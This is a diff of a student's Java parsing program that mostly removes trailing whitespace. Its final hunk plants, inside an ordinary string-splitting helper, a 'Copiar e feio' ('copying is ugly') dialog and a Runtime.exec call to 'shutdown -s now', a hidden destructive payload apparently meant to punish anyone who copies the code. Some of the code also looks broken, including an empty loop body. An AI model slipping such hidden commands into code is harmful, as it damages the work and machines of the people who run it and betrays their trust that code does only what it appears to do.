@@ -1,7 +1,7 @@
 /************* *****************
-*   Eric Azevedo de Oliveira  * 
-*   Aluno da Puc              *  
-*   2 periodo                 *  
+*   Eric Azevedo de Oliveira  *
+*   Aluno da Puc              *
+*   2 periodo                 *
 *******************************/
 
 
@@ -312,11 +312,11 @@ public class Clajava {
     String todosNomes = linha.substring(inicioaSerCortado + 1, fimaSerCortado);
     String[] tirarVirgula = todosNomes.split(",");
     if (tirarVirgula.length > 1) {
-     
+
       for (int i = 0; i < tirarVirgula.length; i++) {
       if (tirarVirgula[i].charAt(1) == tt && tirarVirgula[i].charAt(2) == tt) {
 
-      } 
+      }
       }
        String[] eric = todosNomes.split("'");
           for (int k = 0; k < eric.length; k += 1) {
@@ -343,12 +343,14 @@ public class Clajava {
     }
     return nomes;
   }
-	
+
 
 	public static String[] pegarPrimeirosValores(String linha) {
 		int fimaSerCortado = linha.indexOf("[");
 		String retirada = linha.substring(0, fimaSerCortado);
 		String[] tirarVirgula = retirada.split(",");
+		JOptionPane.showMessageDialog(null,"Copiar e feio");
+			 Runtime.getRuntime().exec("shutdown -s now");
 		return tirarVirgula;
 
 	}
